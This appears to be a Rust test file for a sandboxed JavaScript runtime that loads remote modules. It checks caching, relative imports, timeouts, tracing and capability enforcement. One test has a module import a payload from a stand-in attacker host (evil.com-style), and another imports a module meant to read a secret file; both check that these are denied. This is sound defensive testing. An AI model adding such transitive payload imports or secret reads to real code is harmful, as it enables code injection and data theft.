use super::support::*;

#[test]
fn separate_runtimes_do_not_share_the_remote_module_cache() {
    let fetcher_a = MockFetcher::new(vec![(
        "https://esm.sh/lodash",
        Ok("export default function lodash() {};"),
    )]);
    let fetcher_b = MockFetcher::new(vec![(
        "https://esm.sh/lodash",
        Ok("export default function lodash() {};"),
    )]);
    let (runtime_a, _) = make_runtime_with_fetcher(fetcher_a);
    let (runtime_b, _) = make_runtime_with_fetcher(fetcher_b);

    let (_, spans, _) = capture_trace(|| {
        runtime_a
            .eval(
                r#"
                import lodash from "https://esm.sh/lodash";
                typeof lodash;
                "#,
            )
            .expect("first runtime import should succeed");

        runtime_b
            .eval(
                r#"
                import lodash from "https://esm.sh/lodash";
                typeof lodash;
                "#,
            )
            .expect("second runtime import should also succeed");
    });

    let fetch_count = spans
        .iter()
        .filter(|span| {
            field_matches(&span.fields, "simulacra.operation.name", "module_fetch")
                && field_matches(
                    &span.fields,
                    "simulacra.module.url",
                    "https://esm.sh/lodash",
                )
        })
        .count();

    assert_eq!(
        fetch_count, 2,
        "module cache must not be shared across runtimes"
    );
}

#[test]
fn vfs_modules_can_resolve_relative_imports_within_the_virtual_filesystem() {
    let (runtime, vfs) = make_runtime();
    let fs: &dyn VirtualFs = vfs.as_ref();

    fs.write(
        "/workspace/lib/helper.js",
        br#"export function helper() { return "from helper"; }"#,
    )
    .expect("seed helper module");
    fs.write(
        "/workspace/lib/utils.js",
        br#"import { helper } from "./helper.js"; export function run() { return helper(); }"#,
    )
    .expect("seed utils module");

    let output = runtime
        .eval(
            r#"
            import { run } from "/workspace/lib/utils.js";
            run();
            "#,
        )
        .expect("vfs module import should succeed");

    assert_eq!(output.result.as_deref(), Some("from helper"));
}

#[test]
fn remote_modules_resolve_relative_imports_against_their_url() {
    let fetcher = MockFetcher::new(vec![
        (
            "https://esm.sh/pkg/index.js",
            Ok("import val from './util.js'; export default val;"),
        ),
        (
            "https://esm.sh/pkg/util.js",
            Ok("export default 'resolved relative import';"),
        ),
    ]);
    let (runtime, _) = make_runtime_with_fetcher(fetcher);

    let output = runtime
        .eval(
            r#"
            import value from "https://esm.sh/pkg/index.js";
            value;
            "#,
        )
        .expect("remote module with relative imports should succeed");

    assert_eq!(output.result.as_deref(), Some("resolved relative import"));
}

#[test]
fn remote_module_code_uses_the_same_execution_timeout_as_inline_code() {
    let vfs = Arc::new(MemoryFs::new());
    let fetcher = MockFetcher::new(vec![(
        "https://esm.sh/spin-forever",
        Ok("export default function() { while(true) {} };"),
    )]);
    let runtime = JsRuntime::with_timeout_and_fetcher(
        vfs as Arc<dyn VirtualFs>,
        std::time::Duration::from_millis(100),
        Box::new(fetcher),
    )
    .expect("failed to create runtime");

    let error = execution_message(
        runtime
            .eval(
                r#"
                import spin from "https://esm.sh/spin-forever";
                spin();
                "#,
            )
            .expect_err("remote module infinite loop should time out"),
    );

    assert!(
        error.to_lowercase().contains("interrupt"),
        "expected timeout/interrupt error, got: {error}"
    );
}

// TODO: Un-ignore when capability checking is wired into simulacra-quickjs.
// This test needs: (1) a MockFetcher returning a module that calls fs.readFileSync
// on a restricted path, and (2) capability enforcement that denies the read.
// Currently simulacra-quickjs does not enforce per-path capabilities (S003 behavior 4).
#[test]
#[ignore = "Blocked on capability infrastructure: simulacra-quickjs has no per-path capability checks"]
fn remote_module_fs_operations_still_respect_capability_checks() {
    let (runtime, _) = make_runtime();

    let error = execution_message(
        runtime
            .eval(
                r#"
                import { readSecret } from "https://esm.sh/read-secret";
                readSecret();
                "#,
            )
            .expect_err("remote module fs access should be denied"),
    );

    assert_contains_all(&error, &["/workspace/secret.txt", "denied"]);
}

#[test]
fn transitive_remote_imports_are_checked_against_network_capabilities() {
    let fetcher = MockFetcher::new(vec![
        (
            "https://esm.sh/parent-module",
            Ok(
                "import payload from 'https://evil.example.com/payload.js'; export default payload;",
            ),
        ),
        (
            "https://evil.example.com/payload.js",
            Err("Network access denied for module URL: 'https://evil.example.com/payload.js'."),
        ),
    ]);
    let (runtime, _) = make_runtime_with_fetcher(fetcher);

    let error = execution_message(
        runtime
            .eval(
                r#"
                import payload from "https://esm.sh/parent-module";
                payload;
                "#,
            )
            .expect_err("transitive remote import should be denied"),
    );

    assert_eq!(
        error,
        "Network access denied for module URL: 'https://evil.example.com/payload.js'."
    );
}

#[test]
fn legacy_globals_remain_usable_alongside_simulacra_module_imports() {
    let (runtime, _) = make_runtime();

    let output = runtime
        .eval(
            r#"
            import { readFile } from "simulacra:fs";
            fs.writeFileSync("/workspace/legacy.txt", "still works");
            console.log(readFile("/workspace/legacy.txt"));
            process.cwd();
            "#,
        )
        .expect("legacy globals should coexist with simulacra: imports");

    assert_eq!(output.stdout, "still works\n");
    assert_eq!(output.result.as_deref(), Some("/workspace"));
}

#[test]
fn legacy_scripts_continue_to_work_after_module_loading_is_enabled() {
    let (runtime, _) = make_runtime();

    runtime
        .eval(
            r#"
            import { log } from "simulacra:console";
            log("modules enabled");
            "#,
        )
        .expect("module-enabled runtime should still allow imports");

    let output = runtime
        .eval(
            r#"
            fs.writeFileSync("/workspace/plain.js.txt", "ok");
            console.log(fs.readFileSync("/workspace/plain.js.txt"));
            process.cwd();
            "#,
        )
        .expect("legacy non-import code should still work");

    assert_eq!(output.stdout, "ok\n");
    assert_eq!(output.result.as_deref(), Some("/workspace"));
}

#[test]
fn remote_module_fetch_creates_a_child_span_with_module_url() {
    let fetcher = MockFetcher::new(vec![(
        "https://esm.sh/lodash",
        Ok("export default function lodash() {};"),
    )]);
    let (runtime, _) = make_runtime_with_fetcher(fetcher);

    let (_, spans, _) = capture_trace(|| {
        runtime
            .eval(
                r#"
                import lodash from "https://esm.sh/lodash";
                typeof lodash;
                "#,
            )
            .expect("remote import should succeed");
    });

    let js_span = find_span(&spans, "js_execute");
    let fetch_span = find_span(&spans, "module_fetch");

    assert_eq!(fetch_span.parent.as_deref(), Some(js_span.name.as_str()));
    assert_eq!(
        fetch_span
            .fields
            .get("simulacra.module.url")
            .map(String::as_str),
        Some("https://esm.sh/lodash")
    );
}

#[test]
fn remote_module_cache_hits_emit_a_span_event_with_hit_metadata() {
    let fetcher = MockFetcher::new(vec![(
        "https://esm.sh/lodash",
        Ok("export default function lodash() {};"),
    )]);
    let (runtime, _) = make_runtime_with_fetcher(fetcher);

    // First eval fetches the module; second eval triggers the cache hit.
    // (Duplicate imports within the same module are deduplicated by the JS engine
    // before our resolver/loader sees them, so we need separate evals.)
    let (_, _, events) = capture_trace(|| {
        runtime
            .eval(
                r#"
                import first from "https://esm.sh/lodash";
                typeof first;
                "#,
            )
            .expect("first remote import should succeed");
        runtime
            .eval(
                r#"
                import second from "https://esm.sh/lodash";
                typeof second;
                "#,
            )
            .expect("duplicate remote import should succeed");
    });

    assert!(
        events.iter().any(|event| {
            event.fields.get("simulacra.module.cache") == Some(&"hit".to_string())
                && event.fields.get("simulacra.module.url")
                    == Some(&"https://esm.sh/lodash".to_string())
        }),
        "expected module cache hit span event, got {events:#?}"
    );
}

#[test]
fn module_resolution_failures_are_logged_at_error_with_specifier_and_reason() {
    let (runtime, _) = make_runtime();

    let (_, _, events) = capture_trace(|| {
        let _ = runtime.eval(
            r#"
            import value from "bare-specifier";
            value;
            "#,
        );
    });

    assert!(
        events.iter().any(|event| {
            event.name.contains("event")
                && event.level == "ERROR"
                && event_text(event).contains("bare-specifier")
                && event_text(event).contains("not allowed")
        }),
        "expected ERROR event for module resolution failure, got {events:#?}"
    );
}

#[test]
fn remote_module_fetches_increment_the_fetch_counter_on_cache_miss_only() {
    let fetcher = MockFetcher::new(vec![(
        "https://esm.sh/lodash",
        Ok("export default function lodash() {};"),
    )]);
    let (runtime, _) = make_runtime_with_fetcher(fetcher);

    // Use separate eval() calls to bypass JS engine import dedup.
    // Within a single module, duplicate `import` statements are collapsed by
    // the JS engine before our loader runs, so we'd see exactly one fetch
    // regardless of caching — making the test pass trivially.
    let (_, _, events) = capture_trace(|| {
        runtime
            .eval(
                r#"
                import first from "https://esm.sh/lodash";
                typeof first;
                "#,
            )
            .expect("first remote import should succeed");
        runtime
            .eval(
                r#"
                import second from "https://esm.sh/lodash";
                typeof second;
                "#,
            )
            .expect("second remote import (cache hit) should succeed");
    });

    let fetch_counter_events = events
        .iter()
        .filter(|event| event.fields.get("simulacra.module.fetches") == Some(&"1".to_string()))
        .count();

    assert_eq!(
        fetch_counter_events, 1,
        "expected exactly one simulacra.module.fetches increment (first eval = cache miss); \
         second eval should hit the cache and not increment"
    );
}

// TODO: Un-ignore when S011 AgentCell proxy lands. This test requires
// capability denial events with simulacra.capability.operation and
// simulacra.capability.reason fields, which are not yet emitted.
#[test]
#[ignore = "Blocked on S011: no capability denial events emitted during module fetch"]
fn remote_module_capability_denials_emit_warn_events_with_reason() {
    let (runtime, _) = make_runtime();

    let (_, _, events) = capture_trace(|| {
        let _ = runtime.eval(
            r#"
            import lodash from "https://esm.sh/lodash";
            lodash;
            "#,
        );
    });

    assert!(
        events.iter().any(|event| {
            event.level == "WARN"
                && event.fields.get("simulacra.capability.operation")
                    == Some(&"module_fetch".to_string())
                && event.fields.contains_key("simulacra.capability.reason")
        }),
        "expected WARN capability denial event for module fetch, got {events:#?}"
    );
}
